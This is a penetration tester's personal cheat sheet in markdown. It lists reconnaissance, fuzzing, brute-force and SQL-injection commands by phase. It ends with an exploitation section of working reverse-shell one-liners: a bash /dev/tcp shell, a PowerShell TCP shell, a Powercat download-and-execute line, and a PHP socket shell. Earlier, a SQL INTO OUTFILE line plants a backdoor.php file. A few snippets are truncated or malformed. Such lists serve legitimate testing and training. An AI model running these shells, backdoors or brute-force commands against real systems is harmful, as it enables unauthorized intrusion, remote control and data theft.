# Common Commands

#### My Common commands list, basically Commands I use alot, so would like to have stored and organized for quick usage. 
#### I try to keep them them in order of Phase, and further by usage, to help with methodology. 

<sub>Note: This is an ever evolving list, and is subject to frequent changes</sub>

---
# Setup / Miscellaneous

<details><summary>Export Variables:</summary>

#### Target IP:
```
export IP=""
```
#### Target Port:
```
export PORT=""
```
<sub>Note:Web Server port actively enumerating</sub>

#### Target Port(s):
```
export PORTS=""
```
<sub>Note: All Avaible Ports Seperate by ","</sub>

#### Target URL:
```
export URL=""
```

#### Attack Box IP:
```
export LH=$(ip addr show | awk '/inet.*tun0/ {print $2}' | cut -d '/' -f 1)
```
<sub>Note: Default Tun0 change for interface</sub>

#### Attack Box Port:
```
export LPORT="443"
```
<sub>Note: Local Port To catch reverse shells.</sub>

#### Verify Exports
```
env | grep -E '^(IP|PORT|PORTS|URL|LH|LP)='
```
#### Save Exported $IP/$URL to Hosts
```
echo "$IP $URL" | sudo tee -a /etc/hosts > /dev/null
```

</details>

<details><summary>File Manipulation:</summary>

#### Extract IPs from a text file:  
```
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
```

</details>

<details><summary>Miscellanous:</summary>

### Command Execution Verification - [Ping check]
```
tcpdump -i any -c5 icmp
```
### Check Network
```
netdiscover /r 0.0.0.0/24
```
#### INTO OUTFILE D00R
```
SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
```
#### LFI?:
PHP Filter Checks:
```
php://filter/convert.base64-encode/resource=
```
#### UPLOAD IMAGE?:
```
GIF89a1
```
</details>

# Enumeration:

<details><summary>Nmap:</summary>

#### Basic:
```
nmap -p- -sT -sV -A $IP 
```
 ```
nmap -p- -sC -sV $IP --open
```
```
nmap -p- --script=vuln $IP
```
#### HTTP-Methods:
```
nmap --script http-methods --script-args http-methods.url-path='/website' 
```
```
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
```

#### SMB-Enum-Shares:
```
nmap --script smb-enum-shares $IP
```
#### Sed IPs:
```
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
```

</details> 
<details><summary>WPScan:</summary>

#### WPScan & SSL:
```
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
```
#### WPScan Brute Forceing:
```
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt
```
#### Aggressive Plugin Detection:
```
wpscan --url $URL --enumerate p --plugins-detection aggressive
```

</details>
</details> <details><summary>Nikto:</summary>
  
#### Nikto with SSL and Evasion:
```
nikto --host $IP -ssl -evasion 1
```
<sub>Note: See Evasion Modalaties.</sub>
</details>

</details> <details><summary>DNS_Recon:</summary>
  
#### dns_recon:
```
dnsrecon –d yourdomain.com
```
<sub>Note: See Evasion Modalaties.</sub>
</details>
<details><summary>Gobuster:</summary>
  
#### gobuster directory:
```
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
```
#### gobuster files:
```
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30
```

#### gobuster for SubDomain brute forcing:
```
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
```
<sub>Note: Make sure any DNS name you find resolves to an in-scope address before you test it.</sub>

</details> 
<details><summary>Fuzzing:</summary>
  
#### Wfuzz XSS Fuzzing:
```
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
```
```
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"
```
#### COMMAND INJECTION WITH POST DATA:
```
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
```
#### Test for Paramter Existence!:
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
```
#### AUTHENTICATED FUZZING DIRECTORIES:
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"
```
#### AUTHENTICATED FILE FUZZING:
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"
```
#### FUZZ Directories:
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
```
#### FUZZ FILES:
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
```
#### LARGE WORDS:
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
```
#### USERS:
```
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"
```

</details>
<details><summary>Command Injection:</summary>
 
#### Command Injection with commix, ssl, waf, random agent:
```
commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
```

</details>
<details><summary>SQLMap:</summary>
 
#### Basic:
```
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
```
```
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
```
<sub>Note: /SecLists/Fuzzing/alphanum-case.txt</sub>

</details>
<details><summary>Social Recon:</summary>

#### The Harvester: 
```
theharvester -d domain.org -l 500 -b google
```

</details>
<details><summary>SMTP Enum:</summary>

#### SMTP USER ENUM:
```
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```
```
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```
```
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```
```
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
```
</details>

# Exploitation:

<details><summary>Revshells:</summary>

#### Bash: 
```
bash -c "bash -i >& /dev/tcp/$IP/$LPORT 0>&1"
```
#### Bash Encoded: 
```
echo -n "bash -c \"bash -i >& /dev/tcp/$IP/$LPORT 0>&1\"" | python3 -c 'import sys, urllib.parse; print(
```
<sub>Note: Will Print Encoded Version</sub>

#### Powershell (Powercat): 

```
echo "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$LH/powercat.ps1');powercat -c $IP -p $LPORT -e cmd\""
```
<sub>Note: Will Print the payload to run on victim machine</sub>

#### Powershell (1 Liner):
```
$Text = "\$client = New-Object System.Net.Sockets.TCPClient(\"$IP\", $LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
<sub>Note: Be sure to change $IP and $LPORT </sub>
```

#### PHP 1 Liner: 
```
php -r '$sock=fsockopen("$LH", $LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

</details>

# Post-Exploitation:


# Covering Tracks: 
